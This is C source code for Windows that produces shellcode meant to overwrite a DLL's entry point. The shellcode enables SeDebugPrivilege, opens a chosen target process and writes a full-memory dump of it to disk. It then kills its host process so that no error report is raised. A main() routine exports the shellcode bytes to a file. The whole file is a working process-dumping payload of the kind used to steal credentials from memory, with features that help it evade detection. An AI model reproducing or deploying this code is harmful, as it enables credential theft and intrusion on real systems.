#define _CRT_SECURE_NO_WARNINGS

#include <phnt_windows.h>
#include <phnt.h>
#include <DbgHelp.h>
#include <intrin.h>
#include <stdio.h>

#include "DumpShellcode.h"

#pragma optimize("", off)

PSHELLCODE_PARAMS GetParams();

// Overwrites DllMain (technically CRT DllMain)
BOOL APIENTRY Shellcode(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    PSHELLCODE_PARAMS pParams = NULL;
    MiniDumpWriteDump_t pMiniDumpWriteDump = NULL;
    HANDLE hProcess = NULL;
    HANDLE hFile = NULL;
    HMODULE hDbgHelp = NULL;
    DWORD ignored = 0;

    pParams = GetParams();

    // Resolve remaining import
    hDbgHelp = pParams->pLoadLibraryW(pParams->szDbgHelpDll);
    if (NULL == hDbgHelp)
    {
        __debugbreak();
    }

    pMiniDumpWriteDump = (MiniDumpWriteDump_t)pParams->pGetProcAddress(hDbgHelp, pParams->szMiniDumpWriteDump);
    if (NULL == pMiniDumpWriteDump)
    {
        __debugbreak();
    }

    // Enable SeDebugPrivilege
    if (0 != pParams->pRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &ignored))
    {
        __debugbreak();
    }

    // Acquire handle to target
    hProcess = pParams->pOpenProcess(MAXIMUM_ALLOWED, FALSE, pParams->dwTargetProcessId);
    if (NULL == hProcess)
    {
        __debugbreak();
    }

    // Create output file
    hFile = pParams->pCreateFileW(pParams->dumpPath, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        __debugbreak();
    }

    // Capture dump
    if (!pMiniDumpWriteDump(hProcess, pParams->dwTargetProcessId, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL))
    {
        __debugbreak();
    }

    // Don't trigger WER
    (void)pParams->pTerminateProcess((HANDLE)-1, 0);

    return TRUE;
}

PVOID WhereAmI()
{
    return _ReturnAddress();
}

PSHELLCODE_PARAMS GetParams()
{
    PUCHAR pSearch = (PUCHAR)WhereAmI();
    
    for (;;pSearch++)
    {
        PSHELLCODE_PARAMS pCandidate = (PSHELLCODE_PARAMS)pSearch;

        if ((MAGIC1 == pCandidate->magic1) && (MAGIC2 == pCandidate->magic2))
        {
            return pCandidate;
        }
    }

    return NULL;
}

BOOL EndShellcode()
{
    return TRUE;
}

#include <PathCch.h>

int main()
{
    WCHAR myPath[MAX_PATH] = { 0, };
    HMODULE hMe = GetModuleHandle(NULL);
    PUCHAR shellcodeStart = (PUCHAR)GetProcAddress(hMe, "Shellcode");
    PUCHAR shellcodeEnd = (PUCHAR)GetProcAddress(hMe, "EndShellcode");
    const SIZE_T shellcodeLength = (DWORD)(ULONG_PTR)(shellcodeEnd - shellcodeStart);
    HMODULE hFile = NULL;
    DWORD bytesWritten = 0;

    GetModuleFileNameW(NULL, myPath, ARRAYSIZE(myPath));
    wcsncat(myPath, L".shellcode", ARRAYSIZE(myPath) - wcslen(myPath));

    hFile = CreateFileW(myPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        printf(" [!] Failed to open output file: %ws\n", myPath);
        return 1;
    }
    if (!WriteFile(hFile, shellcodeStart, (DWORD)shellcodeLength, &bytesWritten, NULL) ||
        (bytesWritten != shellcodeLength))
    {
        printf(" [!] Failed to write shellcode with GLE %u\n", GetLastError());
        return 1;
    }

    printf(" [+] Shellcode written to output file: %ws\n", myPath);

    return 0;
}
